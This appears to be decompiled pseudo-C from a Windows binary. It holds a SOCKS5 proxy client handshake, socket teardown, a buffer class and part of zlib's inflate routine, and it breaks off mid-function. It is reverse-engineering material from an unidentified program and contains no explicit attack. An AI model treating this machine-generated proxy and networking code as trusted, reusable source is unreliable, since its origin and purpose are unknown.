undefined4 __thiscall FUN_0040d8c0(void *this,undefined4 param_1,uint param_2)

{
  char cVar1;
  int iVar2;
  uint uVar3;
  undefined *puVar4;
  uint uVar5;
  byte bVar6;
  uint *puVar7;
  uint *unaff_retaddr;
  undefined4 in_stack_00000018;
  undefined4 uVar8;
  int iVar9;
  undefined4 uStack280;
  uint uVar10;
  undefined4 uStack8;
  char cStack4;
  
  uStack280 = in_stack_00000018;
  iVar2 = (**(code **)(*(int *)this + 4))(param_1);
  if (iVar2 != 0) {
    return 0xffffffff;
  }
  bVar6 = 0;
  if ((char)param_2 != '\0') {
    iVar2 = -1;
    puVar7 = unaff_retaddr;
    do {
      bVar6 = (byte)iVar2;
      if (iVar2 == 0) break;
      iVar2 = iVar2 + -1;
      bVar6 = (byte)iVar2;
      cVar1 = *(char *)puVar7;
      puVar7 = (uint *)((int)puVar7 + 1);
    } while (cVar1 != '\0');
    bVar6 = ~bVar6;
  }
  iVar2 = (**(code **)(*(int *)this + 0x20))(*(undefined4 *)((int)this + 4),&stack0xfffffef4,3);
  if ((((iVar2 < 0) ||
       (iVar2 = (**(code **)(*(int *)this + 0x24))(*(undefined4 *)((int)this + 4),&uStack280,2),
       iVar2 < 0)) || ((char)uStack280 != '\x05')) || ((int)uStack280._1_1_ == 0xff))
  goto LAB_0040daa6;
  if (cStack4 == '\0') {
    uVar10 = *unaff_retaddr;
    uStack280 = 0x1000105;
    puVar4 = &stack0xfffffef2;
  }
  else {
    uVar3 = param_2 & 0xff;
    uStack280 = 0x3000105;
    uVar10 = (uint)bVar6;
    uVar5 = uVar3 >> 2;
    puVar7 = (uint *)&stack0xfffffeed;
    while (uVar5 != 0) {
      uVar5 = uVar5 - 1;
      *puVar7 = *unaff_retaddr;
      unaff_retaddr = unaff_retaddr + 1;
      puVar7 = puVar7 + 1;
    }
    param_2 = param_2 & 3;
    while (param_2 != 0) {
      param_2 = param_2 - 1;
      *(undefined *)puVar7 = *(undefined *)unaff_retaddr;
      unaff_retaddr = (uint *)((int)unaff_retaddr + 1);
      puVar7 = (uint *)((int)puVar7 + 1);
    }
    (&stack0xfffffeed)[uVar3] = (char)((uint)uStack8 >> 8);
    (&stack0xfffffeee)[uVar3] = (char)uStack8;
    puVar4 = &stack0xfffffeef + uVar3;
  }
  iVar2 = (**(code **)(*(int *)this + 0x20))
                    (*(undefined4 *)((int)this + 4),&uStack280,puVar4 + -(int)&uStack280);
  if (((iVar2 < 0) ||
      (iVar2 = (**(code **)(*(int *)this + 0x24))(*(undefined4 *)((int)this + 4),&uStack280,4),
      iVar2 < 0)) || (uStack280._1_1_ != '\0')) goto LAB_0040daa6;
  if (uStack280._3_1_ == '\x01') {
    iVar2 = *(int *)this;
    iVar9 = 6;
LAB_0040da85:
    uVar8 = *(undefined4 *)((int)this + 4);
    puVar4 = &stack0xfffffeec;
  }
  else {
    if (uStack280._3_1_ != '\x03') {
      if (uStack280._3_1_ != '\x04') {
        return 0;
      }
      iVar2 = *(int *)this;
      iVar9 = 0x12;
      goto LAB_0040da85;
    }
    (**(code **)(*(int *)this + 0x24))(*(undefined4 *)((int)this + 4),&stack0xfffffeec,1);
    iVar2 = *(int *)this;
    puVar4 = &stack0xfffffeed;
    iVar9 = (uVar10 & 0xff) + 2;
    uVar8 = *(undefined4 *)((int)this + 4);
  }
  iVar2 = (**(code **)(iVar2 + 0x24))(uVar8,puVar4,iVar9);
  if (-1 < iVar2) {
    return 0;
  }
LAB_0040daa6:
  if (0 < *(int *)((int)this + 4)) {
    Ordinal_3(*(int *)((int)this + 4));
  }
  return 0xffffffff;
}

void __fastcall FUN_0040dad0(int param_1)

{
  int iVar1;
  undefined4 *puVar2;
  undefined2 *puStack24;
  undefined4 uStack20;
  undefined local_5;
  undefined2 local_4;
  undefined2 local_2;
  
  if (*(int *)(param_1 + 4) != -1) {
    puStack24 = &local_4;
    uStack20 = 4;
    local_5 = 0xff;
    local_4 = 1;
    local_2 = 1;
    Ordinal_21(*(int *)(param_1 + 4),0xffff,0x80);
    Ordinal_19(*(undefined4 *)(param_1 + 4),&stack0xffffffe7,1,0);
    Ordinal_22(*(undefined4 *)(param_1 + 4),2);
    Ordinal_3(*(undefined4 *)(param_1 + 4));
  }
  iVar1 = 7;
  *(undefined4 *)(param_1 + 4) = 0xffffffff;
  puVar2 = (undefined4 *)(param_1 + 8);
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  *(undefined *)((int)puVar2 + 2) = 0;
  *(undefined *)(param_1 + 0x27) = 0;
  *(undefined4 *)(param_1 + 0x28) = 0x3c;
  return;
}

undefined4 * __thiscall FUN_0040dbb0(void *this,undefined4 param_1)

{
  *(undefined4 *)this = 0x41ba98;
  *(undefined4 *)((int)this + 0x1010) = param_1;
  FUN_0040dd50((int)this);
  return (undefined4 *)this;
}

undefined4 * __thiscall FUN_0040dbd0(void *this,byte param_1)

{
  FUN_0040dbf0((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    operator_delete(this);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_0040dbf0(undefined4 *param_1)

{
  undefined4 *puVar1;
  
  *param_1 = 0x41ba98;
  puVar1 = (undefined4 *)param_1[1];
  if ((puVar1 != (undefined4 *)0x0) && (puVar1 != param_1 + 2)) {
    FUN_00412ac0(puVar1,'\0',0);
  }
  FUN_0040dd50((int)param_1);
  return;
}

void __thiscall FUN_0040dc00(void *this,undefined4 *param_1,char *param_2)

{
  int iVar1;
  undefined4 uVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  char *pcVar8;
  exception local_c [12];
  
  pcVar8 = param_2;
  if (-1 < (int)param_2) {
    iVar1 = *(int *)((int)this + 0x100c);
    if (iVar1 < (int)(param_2 + *(int *)((int)this + 0x1008))) {
      iVar5 = ((int)(param_2 + (*(int *)((int)this + 0x1008) - iVar1)) /
               *(int *)((int)this + 0x1010) + 1) * *(int *)((int)this + 0x1010);
      if (*(undefined4 **)((int)this + 4) == (undefined4 *)((int)this + 8)) {
        puVar7 = (undefined4 *)FUN_00412a90(iVar1 + iVar5);
        *(undefined4 **)((int)this + 4) = puVar7;
        if (puVar7 != (undefined4 *)0x0) {
          uVar4 = *(uint *)((int)this + 0x1008);
          uVar3 = uVar4 >> 2;
          puVar6 = (undefined4 *)((int)this + 8);
          while (uVar3 != 0) {
            uVar3 = uVar3 - 1;
            *puVar7 = *puVar6;
            puVar6 = puVar6 + 1;
            puVar7 = puVar7 + 1;
          }
          uVar4 = uVar4 & 3;
          while (pcVar8 = param_2, uVar4 != 0) {
            uVar4 = uVar4 - 1;
            *(undefined *)puVar7 = *(undefined *)puVar6;
            puVar6 = (undefined4 *)((int)puVar6 + 1);
            puVar7 = (undefined4 *)((int)puVar7 + 1);
          }
        }
      }
      else {
        uVar2 = FUN_00412aa0(*(undefined4 **)((int)this + 4),iVar1 + iVar5);
        *(undefined4 *)((int)this + 4) = uVar2;
      }
      if (*(int *)((int)this + 4) == 0) {
        param_2 = s_memory_00421524;
        exception(local_c,&param_2);
                    // WARNING: Subroutine does not return
        _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
      }
      *(int *)((int)this + 0x100c) = *(int *)((int)this + 0x100c) + iVar5;
    }
    uVar4 = (uint)pcVar8 >> 2;
    puVar7 = (undefined4 *)(*(int *)((int)this + 4) + *(int *)((int)this + 0x1008));
    while (uVar4 != 0) {
      uVar4 = uVar4 - 1;
      *puVar7 = *param_1;
      param_1 = param_1 + 1;
      puVar7 = puVar7 + 1;
    }
    uVar4 = (uint)pcVar8 & 3;
    while (uVar4 != 0) {
      uVar4 = uVar4 - 1;
      *(undefined *)puVar7 = *(undefined *)param_1;
      param_1 = (undefined4 *)((int)param_1 + 1);
      puVar7 = (undefined4 *)((int)puVar7 + 1);
    }
    *(char **)((int)this + 0x1008) = param_2 + *(int *)((int)this + 0x1008);
  }
  return;
}

void __thiscall FUN_0040dd00(void *this,undefined4 *param_1)

{
  char cVar1;
  uint uVar2;
  undefined4 *puVar3;
  
  uVar2 = 0xffffffff;
  puVar3 = param_1;
  do {
    if (uVar2 == 0) break;
    uVar2 = uVar2 - 1;
    cVar1 = *(char *)puVar3;
    puVar3 = (undefined4 *)((int)puVar3 + 1);
  } while (cVar1 != '\0');
  FUN_0040dc00(this,param_1,(char *)~uVar2);
  return;
}

undefined4 __fastcall FUN_0040dd30(int param_1)

{
  return *(undefined4 *)(param_1 + 4);
}

undefined4 __fastcall FUN_0040dd40(int param_1)

{
  return *(undefined4 *)(param_1 + 0x1008);
}

void __fastcall FUN_0040dd50(int param_1)

{
  *(undefined4 *)(param_1 + 0x100c) = 0x1000;
  *(int *)(param_1 + 4) = param_1 + 8;
  *(undefined4 *)(param_1 + 0x1008) = 0;
  return;
}

int __cdecl FUN_0040dda0(int param_1,int param_2,int param_3)

{
  undefined4 uVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  uint uVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined4 *local_4;
  
  puVar6 = *(undefined4 **)(param_1 + 0x30);
  puVar3 = *(undefined4 **)(param_1 + 0x34);
  local_4 = *(undefined4 **)(param_2 + 0xc);
  if (puVar3 < puVar6) {
    puVar3 = *(undefined4 **)(param_1 + 0x2c);
  }
  puVar7 = *(undefined4 **)(param_2 + 0x10);
  puVar4 = (undefined4 *)((int)puVar3 - (int)puVar6);
  if (puVar7 < (undefined4 *)((int)puVar3 - (int)puVar6)) {
    puVar4 = puVar7;
  }
  if ((puVar4 != (undefined4 *)0x0) && (param_3 == -5)) {
    param_3 = 0;
  }
  *(undefined4 **)(param_2 + 0x10) = (undefined4 *)((int)puVar7 - (int)puVar4);
  *(int *)(param_2 + 0x14) = *(int *)(param_2 + 0x14) + (int)puVar4;
  if (*(code **)(param_1 + 0x38) != (code *)0x0) {
    uVar1 = (**(code **)(param_1 + 0x38))(*(undefined4 *)(param_1 + 0x3c),puVar6,puVar4);
    *(undefined4 *)(param_1 + 0x3c) = uVar1;
    *(undefined4 *)(param_2 + 0x30) = uVar1;
  }
  if (puVar4 != (undefined4 *)0x0) {
    uVar2 = (uint)puVar4 >> 2;
    puVar3 = puVar6;
    puVar7 = local_4;
    while (uVar2 != 0) {
      uVar2 = uVar2 - 1;
      *puVar7 = *puVar3;
      puVar3 = puVar3 + 1;
      puVar7 = puVar7 + 1;
    }
    uVar2 = (uint)puVar4 & 3;
    while (uVar2 != 0) {
      uVar2 = uVar2 - 1;
      *(undefined *)puVar7 = *(undefined *)puVar3;
      puVar3 = (undefined4 *)((int)puVar3 + 1);
      puVar7 = (undefined4 *)((int)puVar7 + 1);
    }
    local_4 = (undefined4 *)((int)local_4 + (int)puVar4);
    puVar6 = (undefined4 *)((int)puVar6 + (int)puVar4);
  }
  if (puVar6 == *(undefined4 **)(param_1 + 0x2c)) {
    puVar6 = *(undefined4 **)(param_1 + 0x28);
    if (*(undefined4 **)(param_1 + 0x34) == *(undefined4 **)(param_1 + 0x2c)) {
      *(undefined4 **)(param_1 + 0x34) = puVar6;
    }
    uVar5 = *(int *)(param_1 + 0x34) - (int)puVar6;
    uVar2 = *(uint *)(param_2 + 0x10);
    if (uVar2 < uVar5) {
      uVar5 = uVar2;
    }
    if ((uVar5 != 0) && (param_3 == -5)) {
      param_3 = 0;
    }
    *(int *)(param_2 + 0x10) = uVar2 - uVar5;
    *(int *)(param_2 + 0x14) = *(int *)(param_2 + 0x14) + uVar5;
    if (*(code **)(param_1 + 0x38) != (code *)0x0) {
      uVar1 = (**(code **)(param_1 + 0x38))(*(undefined4 *)(param_1 + 0x3c),puVar6,uVar5);
      *(undefined4 *)(param_1 + 0x3c) = uVar1;
      *(undefined4 *)(param_2 + 0x30) = uVar1;
    }
    if (uVar5 != 0) {
      puVar7 = (undefined4 *)((int)local_4 + uVar5);
      uVar2 = uVar5 >> 2;
      puVar3 = puVar6;
      while (uVar2 != 0) {
        uVar2 = uVar2 - 1;
        *local_4 = *puVar3;
        puVar3 = puVar3 + 1;
        local_4 = local_4 + 1;
      }
      uVar2 = uVar5 & 3;
      puVar6 = (undefined4 *)((int)puVar6 + uVar5);
      puVar4 = local_4;
      while (local_4 = puVar7, uVar2 != 0) {
        uVar2 = uVar2 - 1;
        *(undefined *)puVar4 = *(undefined *)puVar3;
        puVar3 = (undefined4 *)((int)puVar3 + 1);
        puVar4 = (undefined4 *)((int)puVar4 + 1);
      }
    }
  }
  *(undefined4 **)(param_2 + 0xc) = local_4;
  *(undefined4 **)(param_1 + 0x30) = puVar6;
  return param_3;
}

void __cdecl
FUN_0040def0(undefined param_1,undefined param_2,undefined4 param_3,undefined4 param_4,int param_5)

{
  undefined4 *puVar1;
  
  puVar1 = (undefined4 *)(**(code **)(param_5 + 0x20))(*(undefined4 *)(param_5 + 0x28),1,0x1c);
  if (puVar1 != (undefined4 *)0x0) {
    *(undefined *)(puVar1 + 4) = param_1;
    *(undefined *)((int)puVar1 + 0x11) = param_2;
    *puVar1 = 0;
    puVar1[5] = param_3;
    puVar1[6] = param_4;
  }
  return;
}

void __cdecl FUN_0040df30(uint param_1,byte **param_2,int param_3)

{
  int *piVar1;
  int *piVar2;
  uint uVar3;
  undefined *puVar4;
  byte *pbVar5;
  uint uVar6;
  byte **ppbVar7;
  int iVar8;
  byte bVar9;
  undefined *puVar10;
  undefined *puVar11;
  uint uVar12;
  byte *pbVar13;
  undefined *local_10;
  byte *local_c;
  undefined *local_8;
  
  ppbVar7 = param_2;
  uVar6 = param_1;
  piVar2 = *(int **)(param_1 + 4);
  pbVar13 = *param_2;
  uVar12 = *(uint *)(param_1 + 0x1c);
  puVar11 = *(undefined **)(param_1 + 0x34);
  if (puVar11 < *(undefined **)(param_1 + 0x30)) {
    local_10 = *(undefined **)(param_1 + 0x30) + (-1 - (int)puVar11);
  }
  else {
    local_10 = (undefined *)(*(int *)(param_1 + 0x2c) - (int)puVar11);
  }
  iVar8 = *piVar2;
  param_1 = *(uint *)(param_1 + 0x20);
  param_2 = (byte **)param_2[1];
  do {
    switch(iVar8) {
    case 0:
      if ((local_10 < (undefined *)0x102) || (param_2 < &DAT_0000000a)) {
LAB_0040e02c:
        *piVar2 = 1;
        piVar2[3] = (uint)*(byte *)(piVar2 + 4);
        piVar2[2] = piVar2[5];
        goto switchD_0040df7c_caseD_1;
      }
      *(uint *)(uVar6 + 0x20) = param_1;
      *(uint *)(uVar6 + 0x1c) = uVar12;
      pbVar5 = *ppbVar7;
      *(byte ***)(ppbVar7 + 1) = param_2;
      *ppbVar7 = pbVar13;
      ppbVar7[2] = ppbVar7[2] + (int)(pbVar13 + -(int)pbVar5);
      *(undefined **)(uVar6 + 0x34) = puVar11;
      param_3 = FUN_0040fbc0((uint)*(byte *)(piVar2 + 4),(byte *)(uint)*(byte *)((int)piVar2 + 0x11)
                             ,piVar2[5],piVar2[6],uVar6,ppbVar7);
      param_2 = (byte **)ppbVar7[1];
      param_1 = *(uint *)(uVar6 + 0x20);
      pbVar13 = *ppbVar7;
      uVar12 = *(uint *)(uVar6 + 0x1c);
      puVar11 = *(undefined **)(uVar6 + 0x34);
      if (puVar11 < *(undefined **)(uVar6 + 0x30)) {
        local_10 = *(undefined **)(uVar6 + 0x30) + (-1 - (int)puVar11);
      }
      else {
        local_10 = (undefined *)(*(int *)(uVar6 + 0x2c) - (int)puVar11);
      }
      if (param_3 == 0) goto LAB_0040e02c;
      *piVar2 = (-(uint)(param_3 != 1) & 2) + 7;
      goto LAB_0040e4d8;
    case 1:
switchD_0040df7c_caseD_1:
      while (uVar12 < (uint)piVar2[3]) {
        if (param_2 == (byte **)0x0) {
LAB_0040e52e:
          *(uint *)(uVar6 + 0x1c) = uVar12;
          *(uint *)(uVar6 + 0x20) = param_1;
          pbVar5 = *ppbVar7;
          ppbVar7[1] = (byte *)0x0;
          *ppbVar7 = pbVar13;
          ppbVar7[2] = ppbVar7[2] + (int)(pbVar13 + -(int)pbVar5);
          *(undefined **)(uVar6 + 0x34) = puVar11;
          FUN_0040dda0(uVar6,(int)ppbVar7,param_3);
          return;
        }
        param_2 = (byte **)((int)param_2 + -1);
        bVar9 = (byte)uVar12;
        uVar12 = uVar12 + 8;
        param_3 = 0;
        param_1 = param_1 | (uint)*pbVar13 << (bVar9 & 0x1f);
        pbVar13 = pbVar13 + 1;
      }
      local_c = (byte *)(piVar2[2] + (*(uint *)(&DAT_0041a260 + piVar2[3] * 4) & param_1) * 8);
      param_1 = param_1 >> (local_c[1] & 0x1f);
      uVar12 = uVar12 - local_c[1];
      bVar9 = *local_c;
      if (bVar9 == 0) {
        piVar2[2] = *(int *)(local_c + 4);
        *piVar2 = 6;
        goto LAB_0040e4d8;
      }
      if ((bVar9 & 0x10) != 0) {
        piVar2[2] = (uint)bVar9 & 0xf;
        iVar8 = *(int *)(local_c + 4);
        *piVar2 = 2;
        piVar2[1] = iVar8;
        goto LAB_0040e4d8;
      }
      if ((bVar9 & 0x40) != 0) {
        if ((bVar9 & 0x20) == 0) {
          *piVar2 = 9;
          *(char **)(ppbVar7 + 6) = s_invalid_literal_length_code_00421544;
          goto LAB_0040e57a;
        }
        *piVar2 = 7;
        goto LAB_0040e4d8;
      }
      goto LAB_0040e265;
    case 2:
      uVar3 = piVar2[2];
      while (uVar12 < uVar3) {
        if (param_2 == (byte **)0x0) goto LAB_0040e52e;
        param_2 = (byte **)((int)param_2 + -1);
        param_3 = 0;
        param_1 = param_1 | (uint)*pbVar13 << ((byte)uVar12 & 0x1f);
        pbVar13 = pbVar13 + 1;
        uVar12 = uVar12 + 8;
      }
      piVar2[1] = piVar2[1] + (*(uint *)(&DAT_0041a260 + uVar3 * 4) & param_1);
      param_1 = param_1 >> ((byte)uVar3 & 0x1f);
      uVar12 = uVar12 - uVar3;
      *piVar2 = 3;
      piVar2[3] = (uint)*(byte *)((int)piVar2 + 0x11);
      piVar2[2] = piVar2[6];
      break;
    case 3:
      break;
    case 4:
      uVar3 = piVar2[2];
      while (uVar12 < uVar3) {
        if (param_2 == (byte **)0x0) goto LAB_0040e52e;
        param_2 = (byte **)((int)param_2 + -1);
        bVar9 = (byte)uVar12;
        uVar12 = uVar12 + 8;
        param_3 = 0;
        param_1 = param_1 | (uint)*pbVar13 << (bVar9 & 0x1f);
        pbVar13 = pbVar13 + 1;
      }
      piVar2[3] = piVar2[3] + (*(uint *)(&DAT_0041a260 + uVar3 * 4) & param_1);
      param_1 = param_1 >> ((byte)uVar3 & 0x1f);
      uVar12 = uVar12 - uVar3;
      *piVar2 = 5;
    case 5:
      local_8 = puVar11 + -piVar2[3];
      if (local_8 < *(undefined **)(uVar6 + 0x28)) {
        do {
          local_8 = local_8 + (*(int *)(uVar6 + 0x2c) - (int)*(undefined **)(uVar6 + 0x28));
        } while (local_8 < *(undefined **)(uVar6 + 0x28));
      }
      iVar8 = piVar2[1];
      while (iVar8 != 0) {
        puVar10 = puVar11;
        if (local_10 == (undefined *)0x0) {
          if (puVar11 == *(undefined **)(uVar6 + 0x2c)) {
            local_10 = *(undefined **)(uVar6 + 0x30);
            puVar10 = *(undefined **)(uVar6 + 0x28);
            if (local_10 != puVar10) {
              if (puVar10 < local_10) {
                local_10 = local_10 + (-1 - (int)puVar10);
              }
              else {
                local_10 = *(undefined **)(uVar6 + 0x2c) + -(int)puVar10;
              }
              puVar11 = puVar10;
              if (local_10 != (undefined *)0x0) goto LAB_0040e3df;
            }
          }
          *(undefined **)(uVar6 + 0x34) = puVar11;
          param_3 = FUN_0040dda0(uVar6,(int)ppbVar7,param_3);
          puVar10 = *(undefined **)(uVar6 + 0x34);
          puVar11 = *(undefined **)(uVar6 + 0x30);
          if (puVar10 < puVar11) {
            local_10 = puVar11 + (-1 - (int)puVar10);
          }
          else {
            local_10 = (undefined *)(*(int *)(uVar6 + 0x2c) - (int)puVar10);
          }
          if ((puVar10 == *(undefined **)(uVar6 + 0x2c)) &&
             (puVar4 = *(undefined **)(uVar6 + 0x28), puVar11 != puVar4)) {
            puVar10 = puVar4;
            if (puVar4 < puVar11) {
              local_10 = puVar11 + (-1 - (int)puVar4);
            }
            else {
              local_10 = *(undefined **)(uVar6 + 0x2c) + -(int)puVar4;
            }
          }
          if (local_10 == (undefined *)0x0) goto LAB_0040e5b2;
        }
LAB_0040e3df:
        puVar11 = puVar10 + 1;
        param_3 = 0;
        *puVar10 = *local_8;
        local_8 = local_8 + 1;
        local_10 = local_10 + -1;
        if (local_8 == *(undefined **)(uVar6 + 0x2c)) {
          local_8 = *(undefined **)(uVar6 + 0x28);
        }
        piVar1 = piVar2 + 1;
        *piVar1 = *piVar1 + -1;
        iVar8 = *piVar1;
      }
LAB_0040e4d2:
      *piVar2 = 0;
      goto LAB_0040e4d8;
    case 6:
      puVar10 = puVar11;
      if (local_10 == (undefined *)0x0) {
        if (puVar11 == *(undefined **)(uVar6 + 0x2c)) {
          local_10 = *(undefined **)(uVar6 + 0x30);
          puVar10 = *(undefined **)(uVar6 + 0x28);
          if (local_10 != puVar10) {
            if (puVar10 < local_10) {
              local_10 = local_10 + (-1 - (int)puVar10);
            }
            else {
              local_10 = *(undefined **)(uVar6 + 0x2c) + -(int)puVar10;
            }
            puVar11 = puVar10;
            if (local_10 != (undefined *)0x0) goto LAB_0040e4b6;
          }
        }
        *(undefined **)(uVar6 + 0x34) = puVar11;
        param_3 = FUN_0040dda0(uVar6,(int)ppbVar7,param_3);
        puVar10 = *(undefined **)(uVar6 + 0x34);
        puVar11 = *(undefined **)(uVar6 + 0x30);
        if (puVar10 < puVar11) {
          local_10 = puVar11 + (-1 - (int)puVar10);
        }
        else {
          local_10 = (undefined *)(*(int *)(uVar6 + 0x2c) - (int)puVar10);
        }
        if ((puVar10 == *(undefined **)(uVar6 + 0x2c)) &&
           (puVar4 = *(undefined **)(uVar6 + 0x28), puVar11 != puVar4)) {
          puVar10 = puVar4;
          if (puVar4 < puVar11) {
            local_10 = puVar11 + (-1 - (int)puVar4);
          }
          else {
            local_10 = *(undefined **)(uVar6 + 0x2c) + -(int)puVar4;
          }
        }
        if (local_10 == (undefined *)0x0) {
LAB_0040e5b2:
          *(uint *)(uVar6 + 0x20) = param_1;
          *(uint *)(uVar6 + 0x1c) = uVar12;
          pbVar5 = *ppbVar7;
          *(byte ***)(ppbVar7 + 1) = param_2;
          *ppbVar7 = pbVar13;
          ppbVar7[2] = ppbVar7[2] + (int)(pbVar13 + -(int)pbVar5);
          *(undefined **)(uVar6 + 0x34) = puVar10;
          FUN_0040dda0(uVar6,(int)ppbVar7,param_3);
          return;
        }
      }
LAB_0040e4b6:
      puVar11 = puVar10 + 1;
      local_10 = local_10 + -1;
      param_3 = 0;
      *puVar10 = *(undefined *)(piVar2 + 2);
      goto LAB_0040e4d2;
    case 7:
      if (7 < uVar12) {
        uVar12 = uVar12 - 8;
        param_2 = (byte **)((int)param_2 + 1);
        pbVar13 = pbVar13 + -1;
      }
      *(undefined **)(uVar6 + 0x34) = puVar11;
      iVar8 = FUN_0040dda0(uVar6,(int)ppbVar7,param_3);
      puVar11 = *(undefined **)(uVar6 + 0x34);
      if (*(undefined **)(uVar6 + 0x30) != puVar11) {
        *(uint *)(uVar6 + 0x1c) = uVar12;
        *(uint *)(uVar6 + 0x20) = param_1;
        *(byte ***)(ppbVar7 + 1) = param_2;
        ppbVar7[2] = ppbVar7[2] + (int)(pbVar13 + -(int)*ppbVar7);
        *ppbVar7 = pbVar13;
        *(undefined **)(uVar6 + 0x34) = puVar11;
        FUN_0040dda0(uVar6,(int)ppbVar7,iVar8);
        return;
      }
      *piVar2 = 8;
    case 8:
      *(uint *)(uVar6 + 0x20) = param_1;
      *(uint *)(uVar6 + 0x1c) = uVar12;
      *(byte ***)(ppbVar7 + 1) = param_2;
      ppbVar7[2] = ppbVar7[2] + (int)(pbVar13 + -(int)*ppbVar7);
      *ppbVar7 = pbVar13;
      *(undefined **)(uVar6 + 0x34) = puVar11;
      FUN_0040dda0(uVar6,(int)ppbVar7,1);
      return;
    case 9:
      *(uint *)(uVar6 + 0x20) = param_1;
      *(uint *)(uVar6 + 0x1c) = uVar12;
      *(byte ***)(ppbVar7 + 1) = param_2;
      ppbVar7[2] = ppbVar7[2] + (int)(pbVar13 + -(int)*ppbVar7);
      *ppbVar7 = pbVar13;
      *(undefined **)(uVar6 + 0x34) = puVar11;
      FUN_0040dda0(uVar6,(int)ppbVar7,-3);
      return;
    default:
      *(uint *)(uVar6 + 0x20) = param_1;
      *(uint *)(uVar6 + 0x1c) = uVar12;
      *(byte ***)(ppbVar7 + 1) = param_2;
      ppbVar7[2] = ppbVar7[2] + (int)(pbVar13 + -(int)*ppbVar7);
      *ppbVar7 = pbVar13;
      *(undefined **)(uVar6 + 0x34) = puVar11;
      FUN_0040dda0(uVar6,(int)ppbVar7,-2);
      return;
    }
    while (uVar12 < (uint)piVar2[3]) {
      if (param_2 == (byte **)0x0) goto LAB_0040e52e;
      param_2 = (byte **)((int)param_2 + -1);
      param_3 = 0;
      param_1 = param_1 | (uint)*pbVar13 << ((byte)uVar12 & 0x1f);
      pbVar13 = pbVar13 + 1;
      uVar12 = uVar12 + 8;
    }
    local_c = (byte *)(piVar2[2] + (*(uint *)(&DAT_0041a260 + piVar2[3] * 4) & param_1) * 8);
    param_1 = param_1 >> (local_c[1] & 0x1f);
    uVar12 = uVar12 - local_c[1];
    bVar9 = *local_c;
    if ((bVar9 & 0x10) == 0) {
      if ((bVar9 & 0x40) != 0) {
        *piVar2 = 9;
        *(char **)(ppbVar7 + 6) = s_invalid_distance_code_0042152c;
LAB_0040e57a:
        *(uint *)(uVar6 + 0x20) = param_1;
        *(uint *)(uVar6 + 0x1c) = uVar12;
        *(byte ***)(ppbVar7 + 1) = param_2;
        ppbVar7[2] = ppbVar7[2] + (int)(pbVar13 + -(int)*ppbVar7);
        *ppbVar7 = pbVar13;
        *(undefined **)(uVar6 + 0x34) = puVar11;
        FUN_0040dda0(uVar6,(int)ppbVar7,-3);
        return;
      }
LAB_0040e265:
      piVar2[3] = (uint)bVar9;
      *(byte **)(piVar2 + 2) = local_c + *(int *)(local_c + 4) * 8;
    }
    else {
      piVar2[2] = (uint)bVar9 & 0xf;
      iVar8 = *(int *)(local_c + 4);
      *piVar2 = 4;
      piVar2[3] = iVar8;
    }
LAB_0040e4d8:
    iVar8 = *piVar2;
  } while( true );
}

void __cdecl FUN_0040e700(undefined4 param_1,int param_2)

{
  (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1);
  return;
}

void __cdecl FUN_0040e720(int *param_1,int param_2,int *param_3)

{
  int iVar1;
  
  if (param_3 != (int *)0x0) {
    *param_3 = param_1[0xf];
  }
  if ((*param_1 == 4) || (*param_1 == 5)) {
    (**(code **)(param_2 + 0x24))(*(undefined4 *)(param_2 + 0x28),param_1[3]);
  }
  if (*param_1 == 6) {
    FUN_0040e700(param_1[1],param_2);
  }
  *param_1 = 0;
  param_1[0xd] = param_1[10];
  param_1[0xc] = param_1[10];
  param_1[7] = 0;
  param_1[8] = 0;
  if ((code *)param_1[0xe] != (code *)0x0) {
    iVar1 = (*(code *)param_1[0xe])(0,0,0);
    param_1[0xf] = iVar1;
    *(int *)(param_2 + 0x30) = iVar1;
  }
  return;
}

int * __cdecl FUN_0040e7a0(int param_1,int param_2,int param_3)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)(**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,0x40);
  if (piVar1 == (int *)0x0) {
    return (int *)0x0;
  }
  iVar2 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),8,0x5a0);
  piVar1[9] = iVar2;
  if (iVar2 == 0) {
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1);
    return (int *)0x0;
  }
  iVar2 = (**(code **)(param_1 + 0x20))(*(undefined4 *)(param_1 + 0x28),1,param_3);
  piVar1[10] = iVar2;
  if (iVar2 == 0) {
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1[9]);
    (**(code **)(param_1 + 0x24))(*(undefined4 *)(param_1 + 0x28),piVar1);
    return (int *)0x0;
  }
  piVar1[0xb] = iVar2 + param_3;
  piVar1[0xe] = param_2;
  *piVar1 = 0;
  FUN_0040e720(piVar1,param_1,(int *)0x0);
  return piVar1;
}

void __cdecl FUN_0040e840(uint *param_1,byte **param_2,int param_3)

{
  byte bVar1;
  byte *pbVar2;
  uint *puVar3;
  undefined4 *puVar4;
  uint uVar5;
  uint uVar6;
  int iVar7;
  undefined *puVar8;
  undefined4 uVar9;
  undefined *puVar10;
  undefined *puVar11;
  undefined4 *puVar12;
  undefined4 *puVar13;
  undefined4 *puVar14;
  undefined4 *local_34;
  undefined4 *local_30;
  undefined4 *local_2c;
  undefined4 *local_28;
  undefined4 *local_24;
  undefined4 *local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined *local_c;
  uint local_8;
  uint local_4;
  
  puVar3 = param_1;
  puVar10 = (undefined *)param_1[7];
  local_34 = (undefined4 *)param_2[1];
  local_30 = (undefined4 *)param_1[0xd];
  if (local_30 < (undefined4 *)param_1[0xc]) {
    local_2c = (undefined4 *)((int)(undefined4 *)param_1[0xc] + (-1 - (int)local_30));
  }
  else {
    local_2c = (undefined4 *)(param_1[0xb] - (int)local_30);
  }
  uVar5 = *param_1;
  param_1 = (uint *)param_1[8];
  puVar14 = (undefined4 *)*param_2;
  do {
    if (9 < uVar5) {
